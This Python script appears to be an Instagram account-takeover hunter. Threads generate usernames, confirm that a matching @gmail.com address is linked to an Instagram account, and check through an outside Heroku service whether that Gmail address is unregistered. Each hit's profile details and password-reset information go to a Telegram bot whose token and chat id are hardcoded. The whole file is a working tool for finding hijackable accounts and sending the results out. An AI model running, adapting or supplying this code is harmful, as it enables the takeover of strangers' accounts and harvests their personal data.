from Topython import Instagram
import requests , sys , os
from threading import Thread

token = "5451750160:AAHDp0iR9mtlnODx_7cjN_i73cQPCdKeQoM"
id_tele = "5523858080"
R , X , F , C= '\033[1;31;40m' ,  '\033[1;33;40m' , '\033[1;32;40m'  ,"\033[1;97;40m";os.system('clear')

good_IG , bad_IG , good_Gm , bad_Gm = 0 , 0 , 0 , 0

def check_insta(email):
    global good_IG , bad_IG
    response = Instagram.CheckEmail(email+"@gmail.com")
    if response == True :
        good_IG += 1
        check_gmail(email)
    else : bad_IG += 1
        
def check_gmail(email):
    global good_Gm , bad_Gm
    try:
      	response=requests.get('https://check-gmail-43cdb8e63350.herokuapp.com/?email={}'.format(email)).json()
      	if response['status'] == True :      	    
      	    good_Gm += 1  
      	    info_insta(email)
      	else : bad_Gm += 1
    except : check_gmail(email)
        
def info_insta(user):
    reset = Instagram.Rests(user)
    info= Instagram.information(user)
    name , username , followers , following , date , Id , post ,  bio = info['name'] , info['username'] , info['followers'] , info['following'] , info['date'] , info['id'] , info['post'] , info['bio'] 
    send = ("{}\nUsername : {}\nEmail : {}@gmail.com\nFollowers : {}\nFollowing : {}\nDate : {}\nid : {}\nPosts : {}\nBio : {}\nRests {}".format(name,username,username,followers,following,date,Id,post,bio,reset))
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id_tele}&text="+str(send))
    print(F+send)
def run(email):    
    global good_Gm , good_IG , bad_Gm , bad_IG
    check_insta(email) 
    sys.stdout.write(f"\r  Good Gm : {good_Gm}  , Bad IG : {bad_IG}  , Good IG : {good_IG}  , Bad Gm : {bad_Gm} \r")
    sys.stdout.flush()        
    
def gen_users():    
    while True:            
        Generate = Instagram.GenUsers()
        if Generate == None : pass
        else :
            if "_" not in Generate and len(Generate) > 5: run(Generate)

for i in range(10):
  Thread(target=gen_users).start()
